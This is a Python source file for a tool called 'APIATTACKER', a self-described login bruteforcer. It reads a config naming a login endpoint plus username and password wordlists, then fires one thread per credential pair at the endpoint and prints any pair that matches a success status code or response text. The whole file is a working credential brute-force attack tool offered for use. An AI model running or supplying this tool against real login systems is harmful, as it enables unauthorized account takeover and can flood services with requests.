import os, json, threading, time, random
from datetime import datetime
from requests_html import HTMLSession


def check(endpoint, userhead, passhead, username, password, checktype, checkdata, t):
    client = HTMLSession()

    json_data = {
        userhead : username,
        passhead : password
    }

    data = client.post(endpoint, json=json_data)

    if checktype == "status-code":
        if data.status_code == checkdata:
            current_time = int(time.time())
            taken = current_time - int(t)
            print(f"""\n
[CUR-TIME]      >     {datetime.now().strftime('%H:%M:%S')}   
[TM-TAKEN]      >     {taken}s      
[USERNAME]      >     {username}
[PASSWORD]      >     {password}
[RESPONSE]      >     {data.status_code}
            """)
            exit()
    elif checktype == "text-response":
        if checkdata in data.text:
            current_time = int(time.time())
            taken = current_time - int(t)
            print(f"""
[CUR-TIME]      >     {datetime.now().strftime('%H:%M:%S')}   
[TM-TAKEN]      >     {taken}         
[USERNAME]      >     {username}
[PASSWORD]      >     {password}
[RESPONSE]      >     {data.status_code}
            """)
            exit()




def load_configs():
    files = []
    amount = 0
    database = {}
    for file in os.listdir("Configs"):
        amount += 1
        data = f"[ {amount} ] ~ ({file})"
        files.append(data)


    return files

def load_usernames(file):
    with open(file) as f:
        return [username for username in f.read().splitlines()]

def load_passwords(file):
    with open(file) as f:
        return [password for password in f.read().splitlines()]




def main():
    art = """
╔═╗╔═╗╦  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═╔═╗╦═╗
╠═╣╠═╝║  ╠═╣ ║  ║ ╠═╣║  ╠╩╗║╣ ╠╦╝
╩ ╩╩  ╩  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩╚═╝╩╚═
> Simple login bruteforcer
> Developed by /jwe0
    """
    print(art)


    print("\n".join(load_configs()))
    print()

    config_choice = input("[Root@APIA] ~ (./config)   > ")
    username_file = input("[Root@APIA] ~ (./userfile) > ")
    password_file = input("[Root@APIA] ~ (./passfile) > ")


    if os.path.exists(username_file):
        usernames = load_usernames(username_file)

    if os.path.exists(password_file):
        passwords = load_passwords(password_file)

    if os.path.exists("Configs/" + config_choice):
        with open("Configs/" + config_choice) as f:
            config = json.load(f)


            url = config["endpoint"]
            auth_type = config["auth-type"]
            auth_data = config["auth-data"]
            user_head = config["request-data"]["username"]
            pass_head = config["request-data"]["password"]

            print(f"""
[AUTH-PATH]     >     {url}
[AUTH-TYPE]     >     {auth_type}
[AUTH-DATA]     >     {auth_data}
[HEAD-USER]     >     {user_head}
[HEAD-PASS]     >     {pass_head}   
[USER-FILE]     >     {username_file} | {len(usernames)}
[PASS-FILE]     >     {password_file} | {len(passwords)}\n""")

            start = time.time()

    for username in usernames:
        for password in passwords:
            print(f"[DEBUG]         >     {username} : {password}", end='\r')
            threading.Thread(target=check, args=[url, user_head, pass_head, username, password, auth_type, auth_data, start]).start()


            

main()